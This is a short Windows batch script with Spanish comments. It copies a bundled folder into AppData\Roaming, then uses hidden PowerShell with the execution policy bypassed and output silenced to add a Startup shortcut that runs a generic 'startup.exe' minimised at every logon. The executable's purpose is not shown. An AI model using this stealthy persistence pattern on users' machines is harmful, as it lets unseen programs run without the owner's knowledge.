@echo off
setlocal

REM VARIABLES
set "nombre_usuario=%USERNAME%"
set "carpeta_startup=C:\Users\%nombre_usuario%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "carpeta_roaming=C:\Users\%nombre_usuario%\AppData\Roaming"
set "carpeta_actual=%~dp0"
set "carpeta_origen=%~dp0Startup"
set "ruta_exe=%carpeta_roaming%\Startup\startup.exe"
set "ruta_lnk=%carpeta_startup%\startup.lnk"

REM Copiar carpeta Startup al directorio Roaming
xcopy "%carpeta_origen%" "%carpeta_roaming%\Startup\" /E /I /Y /H /K >nul

REM Generar acceso directo apuntando al ejecutable en Roaming
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$ws = New-Object -ComObject WScript.Shell; $lnk = $ws.CreateShortcut('%ruta_lnk%'); $lnk.TargetPath = '%ruta_exe%'; $lnk.WorkingDirectory = '%carpeta_roaming%\Startup'; $lnk.WindowStyle = 7; $lnk.Save()" >nul 2>&1

endlocal